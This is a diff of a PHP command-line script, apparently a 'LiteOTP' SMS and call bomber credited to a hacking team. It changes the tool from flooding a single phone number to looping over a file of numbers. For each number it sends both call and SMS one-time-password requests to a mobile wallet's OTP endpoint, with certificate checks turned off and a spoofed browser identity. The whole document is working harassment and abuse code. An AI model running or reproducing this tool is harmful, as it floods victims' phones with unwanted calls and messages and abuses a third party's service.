@@ -1,65 +1,64 @@
-#!/data/data/com.termux/files/usr/bin/php
+#!/usr/bin/env php
 <?php
-system('clear');
-$green  = "\e[92m";
-$red    = "\e[91m";
-$yellow = "\e[93m";
-$blue   = "\e[36m";
-echo "\n$yellow
-   __   _  _             ___  _____    ___ 
-  / /  (_)| |_   ___    /___\/__   \  / _ \
- / /   | || __| / _ \  //  //  / /\/ / /_)/
-/ /___ | || |_ |  __/ / \_//  / /   / ___/ 
-\____/ |_| \__| \___| \___/   \/    \/";
-echo "\n$blue
-Author  : Cvar1984
-Code    : PHP
-Github  : http://github.com/Cvar1984
-Team    : Blackhole Security
-Version : 2.0 ( Alpha )
-Date    : 13-03-2018\n";
-echo "$red=========================== Cvar1984 ))=====(@)>$green\n";
-@header('Content-Type: text/html; charset=UTF-8');
-function input($echo) {
-    echo "$echo --> ";
-}
-input("Phone Number ex: 62888xxxxx");
-$nope=trim(fgets(STDIN));
-input("Call / SMS [c/s]");
-$tipe=trim(fgets(STDIN));
-if($tipe == "s") {
-input("Count");
-$count = trim(fgets(STDIN));
-$param="msisdn={$nope}&accept=";
+if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {
+    $R  = "";
+    $RR = "";
+    $G  = "";
+    $GG = "";
+    $B  = "";
+    $BB = "";
+    $Y  = "";
+    $YY = "";
+    $X  = "";
+    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0';
 } else {
-	$count="1";
-	$param="msisdn={$nope}&accept=call";
+    $R  = "\e[91m";
+    $RR = "\e[91;7m";
+    $G  = "\e[92m";
+    $GG = "\e[92;7m";
+    $B  = "\e[36m";
+    $BB = "\e[36;7m";
+    $Y  = "\e[93m";
+    $YY = "\e[93;7m";
+    $X  = "\e[0m";
+    $ua = 'Mozilla/5.0 (Linux; Android 5.1.1; Andromax A16C3H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36';
+    system('clear');
 }
-echo "$red=========================== Cvar1984 ))=====(@)>$green\n";
+function post_data($url,$data) {
+	global $ua;
+	$ch=curl_init($url);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_USERAGENT, $ua);
+	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+	ob_start();
+	return curl_exec($ch);
+	ob_end_clean();
+	curl_close($ch);
+}
+// end of function
+echo $Y.
+"
+ _     _ _        ___ _____ ____  
+| |   (_) |_ ___ / _ \_   _|  _ \ 
+| |   | | __/ _ \ | | || | | |_) |
+| |___| | ||  __/ |_| || | |  __/ 
+|_____|_|\__\___|\___/ |_| |_|";
+echo $R."\n++++++++++++++++++++++++++++++++++++++";
+echo $B."\nAuthor  : Cvar1984                   ".$R.'+';
+echo $B."\nGithub  : https://github.com/Cvar1984".$R.'+';
+echo $B."\nTeam    : BlackHole Security         ".$R.'+';
+echo $B."\nVersion : 2.1                        ".$R.'+';
+echo $B."\nDate    : 13-03-2018                 ".$R.'+';
+echo $R."\n++++++++++++++++++++++++++++++++++++++".$G.$X."\n\n";
+isset($argv[1]) OR die($RR."[!] Input No List [!]\n".$X);
 
-for($x = 0; $x < $count; $x++) {
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'https://www.tokocash.com/oauth/otp');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS,$param);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    $tampil=curl_exec($ch);
-    curl_close($ch);
-    echo "Send OTP To -> $nope"."\n";
-    if(preg_match('/otp_attempt_left/', $tampil)) {
-    	echo $green."OTP Send Success\n";
-    	} else {
-    		die("$red"."OTP Send Failed\n");
-    	}
-    $sleep = array(
-        "10",
-        "5",
-        "1",
-    ); // Detik
-    $slp   = array_rand($sleep);
-    $slp2  = $sleep[$slp];
-    echo "Sleeping For $slp2 Second\n";
-    echo "$red=========================== Cvar1984 ))=====(@)>$green\n";
-    sleep($slp2); // Random Interval
+$argv[1]=explode("\n", file_get_contents($argv[1]));
+//file_put_contents('array.php','<?php return'.var_export($argv[1],true).";\n");
+foreach($argv[1] as $argv[1]) {
+	post_data('https://www.tokocash.com/oauth/otp',"msisdn={$argv[1]}&accept=call");
+	post_data('https://www.tokocash.com/oauth/otp',"msisdn={$argv[1]}&accept=");
+	echo "Send OTP To -> ".$GG.$argv[1].$X."\n";
 }
-?>
+die($Y.'=========================== Cvar1984 ))=====(@)>'.$X."\n");
